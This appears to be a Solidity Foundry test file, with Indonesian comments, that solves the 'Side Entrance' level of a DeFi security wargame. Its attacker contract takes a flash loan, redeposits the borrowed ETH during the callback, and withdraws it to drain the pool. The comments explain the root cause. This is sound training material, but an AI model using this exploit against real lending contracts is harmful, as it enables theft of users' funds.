// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

// Kontrak penyerang: menjadi borrower flash loan, lalu "masuk lewat
// pintu samping" — deposit ETH pinjaman kembali ke pool SELAMA callback,
// sehingga cek saldo flash loan lolos padahal ETH sudah tercatat sebagai
// saldo deposit milik penyerang.
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal pool;
    address payable internal attacker;

    constructor(address poolAddress, address attackerAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        attacker = payable(attackerAddress);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        // Setelah callback, 1000 ETH tercatat sebagai deposit milik kontrak ini
        pool.withdraw();
        // Teruskan ke attacker EOA
        payable(attacker).transfer(address(this).balance);
    }

    function execute() external payable override {
        // "Side entrance": kembalikan ETH pinjaman sebagai DEPOSIT, bukan
        // sebagai pelunasan flash loan. Saldo pool pulih -> cek flash loan
        // lolos, tapi ETH kini milik kami menurut akuntansi deposit.
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Root cause: flashLoan hanya mengecek saldo ETH pool kembali
        // seperti semula — ia TIDAK mengecek BAGAIMANA saldo itu kembali.
        // Callback execute() memanggil deposit{value: 1000 ether} sehingga
        // ETH pinjaman tercatat sebagai deposit milik penyerang; cek saldo
        // lolos, lalu withdraw() menariknya keluar secara sah menurut
        // akuntansi pool.
        SideEntranceAttacker attackerContract = new SideEntranceAttacker(
            address(sideEntranceLenderPool),
            attacker
        );
        attackerContract.attack();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
